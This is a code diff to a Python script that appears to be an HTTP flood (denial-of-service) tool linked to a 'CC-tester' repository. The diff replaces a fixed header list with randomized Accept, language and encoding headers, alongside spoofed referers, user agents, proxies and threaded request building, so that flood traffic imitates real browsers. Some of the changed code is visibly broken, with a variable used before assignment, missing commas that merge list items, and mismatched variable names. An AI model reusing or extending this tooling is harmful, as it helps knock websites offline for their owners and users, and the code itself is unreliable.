@@ -30,19 +30,6 @@ Version 3.7.1 (2022/3/24)
 │ Link: https://github.com/bloodsbro/CC-tester│
 └─────────────────────────────────────────────┘''')
 
-acceptall = [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\n"
-		"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6\r\nAccept-Encoding: gzip, deflate, br\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml\r\nAccept-Language: ru-RU,ru;q=0.9,en-US;q=0.8\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",]
-
 referers = [
 	"https://check-host.net/",
 	"https://www.facebook.com/",
@@ -79,6 +66,43 @@ def build_threads(mode,thread_num,event,proxy_type,proxy_timeout):
 	th.daemon = True
 	th.start()
 
+
+def generateAcceptHeader():
+	accept = Choice([
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n",
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\n",
+		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\n",
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
+
+	])
+
+	lang = Choice([
+		"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6\r\n",
+		"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8\r\n",
+		"Accept-Language: ru-RU,ru;q=0.9,en;q=0.8\r\n"
+		"Accept-Language: ru-RU,ru;q=0.9,uk;q=0.8\r\n"
+		"Accept-Language: en-US,en;q=0.9,ru;q=0.8\r\n"
+	])
+
+	encoding = Choice([
+		"Accept-Encoding: gzip, deflate\r\n",
+		"Accept-Encoding: gzip\r\n",
+		"Accept-Encoding: deflate, br\r\n",
+		"Accept-Encoding: gzip, deflate, br\r\n",
+		"Accept-Encoding: identity\r\n",
+		"Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5\r\n",
+		"Accept-Encoding: gzip, compress\r\n",
+		"Accept-Encoding: compress, gzip;q=1.0, *;q=0.5\r\n",
+		"Accept-Encoding: gzip;q=1.0, deflate;q=0.6, br;q=0.2\r\n",
+	])
+
+	return accept + lang + encoding
 
 def getuseragent():
 	platform = Choice(['Macintosh', 'Windows', 'X11'])
@@ -144,28 +168,26 @@ def GenReqHeader(method):
 		sec += "sec-fetch-user: ?1\r\n"
 		sec += "upgrade-insecure-requests: 1\r\n"
 
-		if Intn(1, 2) == 1:
-			rv = Intn(100, 106)
-			useragent += "; rv:" + rv + ".0"
-		useragent += "\r\n"
+	if Intn(1, 2) == 1:
+		rv = Intn(100, 106)
+		useragent += "; rv:" + rv + ".0"
+	useragent += "\r\n"
+
+	accept = generateAcceptHeader()
+	if cookies != "":
+		connection += "Cookies: "+str(cookies)+"\r\n"
 
 	if method == "get" or method == "head":
 		connection = "Connection: Keep-Alive\r\n"
-		if cookies != "":
-			connection += "Cookies: "+str(cookies)+"\r\n"
-		accept = Choice(acceptall)
 		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
 		header =  referer + useragent + accept + connection + sec + "\r\n"
 	elif method == "post":
 		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
 		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
 		refer = "Referer: http://"+ target + path + "\r\n"
-		accept = Choice(acceptall)
 		if data == "":# You can enable customize data
 			data = str(random._urandom(16))
 		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
-		if cookies != "":
-			length += "Cookies: "+str(cookies)+"\r\n"
 		header = post_host + accept + refer + content + user_agent + sec + length + "\n" + data + "\r\n\r\n"
 	return header
 
@@ -174,6 +196,7 @@ def ParseUrl(original_url):
 	global path
 	global port
 	global protocol
+
 	original_url = original_url.strip()
 	url = ""
 	path = "/"#default value
